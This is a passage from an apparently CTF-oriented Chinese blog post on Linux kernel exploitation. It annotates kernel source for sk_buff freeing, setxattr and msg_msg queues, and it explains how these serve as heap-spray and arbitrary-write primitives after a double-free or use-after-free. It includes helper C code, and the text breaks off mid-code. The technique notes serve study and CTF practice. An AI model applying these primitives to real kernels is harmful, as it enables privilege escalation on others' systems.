&#123;</span><br><span class="line">		<span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">			copy = len;</span><br><span class="line">		n = INDIRECT_CALL_1(cb, simple_copy_to_iter,</span><br><span class="line">				    skb-&gt;data + offset, copy, data, to);</span><br><span class="line">		offset += n;</span><br><span class="line">		<span class="keyword">if</span> (n != copy)</span><br><span class="line">			<span class="keyword">goto</span> short_copy;</span><br><span class="line">		<span class="keyword">if</span> ((len -= copy) == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">/* Copy paged appendix. Hmm... why does this look so complicated? */</span></span><br><span class="line">    <span class="comment">//linux内核维护人员都看不下去了,xs</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里使用了感觉很复杂的机制，不是很懂。</p>

        <h5 id="B-内存释放"   >
          <a href="#B-内存释放" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-内存释放" class="headerlink" title="B.内存释放"></a>B.内存释放</h5>
      <p>进入内存释放的函数调用链为</p>
<ul>
<li><p>释放<code>skb-&gt;data</code>部分：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consume_skb()-&gt;__kfree_skb()-&gt;skb_release_all()-&gt;skb_release_all()-&gt;skb_release_data()-&gt;skb_free_head()</span><br></pre></td></tr></table></div></figure>

<p>对应函数如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">skb_free_head</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//其实head和data是一样的</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *head = skb-&gt;head;</span><br><span class="line">	<span class="keyword">if</span> (skb-&gt;head_frag) &#123;</span><br><span class="line">		<span class="keyword">if</span> (skb_pp_recycle(skb, head))</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		skb_free_frag(head);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		kfree(head);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到使用的正常的<code>kfree</code>函数</p>
</li>
<li><p>释放<code>skb</code>部分：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consume_skb()-&gt;__kfree_skb()-&gt;kfree_skbmem()</span><br></pre></td></tr></table></div></figure>

<p>相关函数如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">kfree_skbmem</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_fclones</span> *<span class="title">fclones</span>;</span></span><br><span class="line">    <span class="comment">//克隆体相关的,没有fork之类的话一般不用太管的</span></span><br><span class="line">    <span class="keyword">switch</span> (skb-&gt;fclone) &#123;</span><br><span class="line">        <span class="keyword">case</span> SKB_FCLONE_UNAVAILABLE:</span><br><span class="line">            <span class="comment">//用专门的cache(skbuff_head_cache)进行回收</span></span><br><span class="line">            kmem_cache_free(skbuff_head_cache, skb);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> SKB_FCLONE_ORIG:</span><br><span class="line">            fclones = container_of(skb, struct sk_buff_fclones, skb1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* We usually free the clone (TX completion) before original skb</span></span><br><span class="line"><span class="comment">		 * This test would have no chance to be true for the clone,</span></span><br><span class="line"><span class="comment">		 * while here, branch prediction will be good.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">            <span class="keyword">if</span> (refcount_read(&amp;fclones-&gt;fclone_ref) == <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">goto</span> fastpath;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>: <span class="comment">/* SKB_FCLONE_CLONE */</span></span><br><span class="line">            fclones = container_of(skb, struct sk_buff_fclones, skb2);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!refcount_dec_and_test(&amp;fclones-&gt;fclone_ref))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">fastpath:</span><br><span class="line">    <span class="comment">//用专门的cache(skbuff_fclone_cache)进行回收克隆的skb</span></span><br><span class="line">    kmem_cache_free(skbuff_fclone_cache, fclones);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>这个就不太好利用了。</p>
<p>同样的，当关闭的信道的两端，该信道内产生的所有的<code>sk_buff</code>和<code>skb-&gt;data</code>都会得到释放</p>
</li>
</ul>

        <h5 id="内存释放总结："   >
          <a href="#内存释放总结：" class="heading-link"><i class="fas fa-link"></i></a><a href="#内存释放总结：" class="headerlink" title="内存释放总结："></a>内存释放总结：</h5>
      <ul>
<li><p>当从信道中将某条消息全部读取完之后，会发生该条消息对应的<code>sk_buff</code>和<code>skb-&gt;data</code>的内存释放，且<code>sk_buff</code>释放到专门的缓存池中，<code>skb-&gt;data</code>使用正常的<code>kfree</code>释放</p>
</li>
<li><p>当关闭信道两端，该信道内产生的所有的<code>sk_buff</code>和<code>skb-&gt;data</code>都会得到释放，具体的调用链为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sock_close()-&gt;__sock_release()-&gt;unix_release()-&gt;__kfree_skb()</span><br></pre></td></tr></table></div></figure>

<p>后面就类似了。</p>
</li>
</ul>

        <h2 id="9-setxattr—近乎任意大小"   >
          <a href="#9-setxattr—近乎任意大小" class="heading-link"><i class="fas fa-link"></i></a><a href="#9-setxattr—近乎任意大小" class="headerlink" title="9.setxattr—近乎任意大小"></a>9.setxattr—近乎任意大小</h2>
      <p>这个总结过，直接扒过来</p>
<p>调用链为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()-&gt;path_setxattr()-&gt;setxattr()</span><br></pre></td></tr></table></div></figure>

<p>代码如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fs/xattr.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">setxattr</span><span class="params">(struct user_namespace *mnt_userns, struct dentry *d,</span></span></span><br><span class="line"><span class="params"><span class="function">	 <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value, <span class="keyword">size_t</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function">	 <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">void</span> *kvalue = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">char</span> kname[XATTR_NAME_MAX + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; ~(XATTR_CREATE|XATTR_REPLACE))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	error = strncpy_from_user(kname, name, <span class="keyword">sizeof</span>(kname));</span><br><span class="line">	<span class="keyword">if</span> (error == <span class="number">0</span> || error == <span class="keyword">sizeof</span>(kname))</span><br><span class="line">		error = -ERANGE;</span><br><span class="line">	<span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size) &#123;</span><br><span class="line">		<span class="keyword">if</span> (size &gt; XATTR_SIZE_MAX)</span><br><span class="line">			<span class="keyword">return</span> -E2BIG;</span><br><span class="line">        <span class="comment">//申请chunk，基本相当于kmalloc函数，size可控</span></span><br><span class="line">		kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!kvalue)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="comment">//从value拷贝内容到kvalue，value可控</span></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line">			error = -EFAULT;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ((<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_ACCESS) == <span class="number">0</span>) ||</span><br><span class="line">		    (<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == <span class="number">0</span>))</span><br><span class="line">			posix_acl_fix_xattr_from_user(mnt_userns, kvalue, size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	error = vfs_setxattr(mnt_userns, d, kname, kvalue, size, flags);</span><br><span class="line">out:</span><br><span class="line">    <span class="comment">//释放chunk，基本等于kfree函数</span></span><br><span class="line">	kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>关注点在<code>kvmalloc</code>、<code>copy_from_user</code>、<code>kvfree</code>。</p>
<p><code>kvmalloc</code>中的size可控，<code>copy_from_user</code>中的<code>value</code>可控</p>
<p>也就是说当<code>freelist</code>中存在我们需要修改的chunk，而该chunk又是我们控制的某个设备内存块时，(通过double-free或者UAF实现)那么我们就可以通过<code>setxattr</code>来对该设备内存进行任意写。虽然最后会释放，但是也只会影响内存块中存放下一个chunk地址处的内容0x8个字节，而当我们用不着这个地方的内容时，就不用太关注了。</p>

        <h3 id="🔺注：-2"   >
          <a href="#🔺注：-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：-2" class="headerlink" title="🔺注："></a>🔺注：</h3>
      <p>使用的时候需要注意指定一个当前的exp程序，类似如下，第二个参数字符串任意。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setxattr(<span class="string">&quot;/tmp/ufdExp&quot;</span>, <span class="string">&quot;PIG-007&quot;</span>, &amp;buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></div></figure>


        <h2 id="10-msg-msg结构体—kmalloc-16至kmalloc-1024"   >
          <a href="#10-msg-msg结构体—kmalloc-16至kmalloc-1024" class="heading-link"><i class="fas fa-link"></i></a><a href="#10-msg-msg结构体—kmalloc-16至kmalloc-1024" class="headerlink" title="10.msg_msg结构体—kmalloc-16至kmalloc-1024"></a>10.msg_msg结构体—kmalloc-16至kmalloc-1024</h2>
      <p>这个在之前也总结过，不过总结得有些错误，也不太完善，这里再好好总结一下</p>
<p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#%E5%88%86%E9%85%8D%EF%BC%88GFP-KERNEL-ACCOUNT%EF%BC%89%EF%BC%9Amsgsnd-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" >【NOTES.0x08】Linux Kernel Pwn IV：通用结构体与技巧 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252558" >Linux内核中利用msg_msg结构实现任意地址读写 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zorro.gitbooks.io/poor-zorro-s-linux-book/content/linuxde-jin-cheng-jian-tong-xin-xiao-xi-dui-lie.html" >Linux的进程间通信 - 消息队列 · Poor Zorro’s Linux Book (gitbooks.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>《Linux系统编程手册》</p>
<p>虽然写的是最大<code>kmalloc-1024</code>，但是在堆喷时，可以连续<code>kmalloc(1024)</code>从而获得连续的堆内存分布，这样都释放掉之后再经过回收机制就可以申请到更大的<code>kmallo-xx</code>了。</p>

        <h3 id="1-使用方法-2"   >
          <a href="#1-使用方法-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-使用方法-2" class="headerlink" title="(1)使用方法"></a>(1)使用方法</h3>
      
        <h4 id="①创建-2"   >
          <a href="#①创建-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#①创建-2" class="headerlink" title="①创建"></a>①创建</h4>
      <ul>
<li><p>首先创建<code>queue_id</code>管理标志，对应于内核空间的<code>msg_queue</code>管理结构</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//key要么使用ftok()算法生成,要么指定为IPC_PRIVATE</span></span><br><span class="line"><span class="comment">//代表着该消息队列在内核中唯一的标识符</span></span><br><span class="line"><span class="comment">//使用IPC_PRIVATE会生成全新的消息队列IPC对象</span></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br></pre></td></tr></table></div></figure>

<p>使用简单封装的<code>msgget</code>函数或者系统调用号<code>__NR_msgget</code>，之后保存数据的消息就会在这个<code>queue_id</code>管理标志，以及内核空间的<code>msg_queue</code>管理结构下进行创建</p>
</li>
</ul>

        <h4 id="②数据传输"   >
          <a href="#②数据传输" class="heading-link"><i class="fas fa-link"></i></a><a href="#②数据传输" class="headerlink" title="②数据传输"></a>②数据传输</h4>
      <ul>
<li><p>写入消息：</p>
<p>然后就可以依据<code>queue_id</code>写入消息了，不同于<code>pipe</code>和<code>socketpair</code>，这个需要特定的封装函数（<code>msgsnd/msgrcv</code>）或者对应的系统调用（<code>__NR_msgrcv/__NR_msgsnd</code>）来实现。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="comment">//msg_buf实际上为msgp,里面包含mtype,这个mtype在后面的堆块构造中很有用</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//任意指定</span></span><br><span class="line">msg *message = (msg *)queue_send_buf;</span><br><span class="line">message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br></pre></td></tr></table></div></figure></li>
<li><p>读取消息：</p>
<p>之后即可依据<code>queue_id</code>读取消息</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//任意指定</span></span><br><span class="line">get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>mtype</code></p>
<p>可通过设置该值来实现不同顺序的消息读取，在之后的堆块构造中很有用</p>
<ul>
<li>在写入消息时，指定<code>mtype</code>，后续接收消息时可以依据此<code>mtype</code>来进行非顺序接收</li>
<li>在读取消息时，指定<code>msgtyp</code>，分为如下情况<ul>
<li><code>msgtyp</code>大于0：那么在<code>find_msg</code>函数中，就会将遍历寻找消息队列里的第一条等于<code>msgtyp</code>的消息，然后进行后续操作。</li>
<li><code>msgtyp</code>等于0：即类似于顺序读取，<code>find_msg</code>函数会直接获取到消息队列首个消息。</li>
<li><code>msgtyp</code>小于0：会将等待的消息当成优先队列来处理，<code>mtype</code>的值越小，其优先级越高。</li>
</ul>
</li>
</ul>
</li>
<li><p><code>msg_flag</code></p>
</li>
</ul>
<p>可以关注一下<code>MSG_NOERROR</code>标志位，比如说<code>msg_flag</code>没有设置<code>MSG_NOERROR</code>的时候，那么情况如下：</p>
<p>假定获取消息时输入的长度<code>m_ts_size</code>为<code>0x200</code>，且这个长度大于通过<code>find_msg()</code>函数获取到的消息长度<code>0x200</code>，则可以顺利读取，如果该长度小于获取到的消息长度<code>0x200</code>，则会出现如下错误</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png"></p>
<p>但是如果设置了<code>MSG_NOERROR</code>，那么即使传入接收消息的长度小于获取到的消息长度，仍然可以顺利获取，但是多余的消息会被截断，相关内存还是会被释放，这个在源代码中也有所体现。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c do_msgrcv函数中</span></span><br><span class="line"><span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">    msg = ERR_PTR(-E2BIG);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>此外还有更多的<code>msg_flag</code>，就不一一举例了。</p>

        <h4 id="③释放"   >
          <a href="#③释放" class="heading-link"><i class="fas fa-link"></i></a><a href="#③释放" class="headerlink" title="③释放"></a>③释放</h4>
      <p>这个主要是用到<code>msgctl</code>封装函数或者<code>__NR_msgctl</code>系统调用，直接释放掉所有的消息结构，包括申请的<code>msg_queue</code>的结构</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其中IPC_RMID这个cmd命令代表释放掉该消息队列的所有消息,各种内存结构体等</span></span><br><span class="line"><span class="keyword">if</span>(msgctl(queue_id),IPC_RMID,<span class="literal">NULL</span>)==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    perror(<span class="string">&quot;msgctl&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>不过一般也用不到，可能某些合并obj的情况能用到?</p>
<p>此外还有更多的<code>cmd</code>命令，常用来设置内核空间的<code>msg_queue</code>结构上的相关数据，不过多介绍了。</p>

        <h4 id="总结"   >
          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结" class="headerlink" title="总结"></a>总结</h4>
      <p>总结一下大致的使用方法如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> queue_id, m_ts_size;</span><br><span class="line">    <span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">    </span><br><span class="line">    m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;</span><br><span class="line">    msgp *message = (msgp *)queue_send_buf;</span><br><span class="line">    message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(message-&gt;mtext,<span 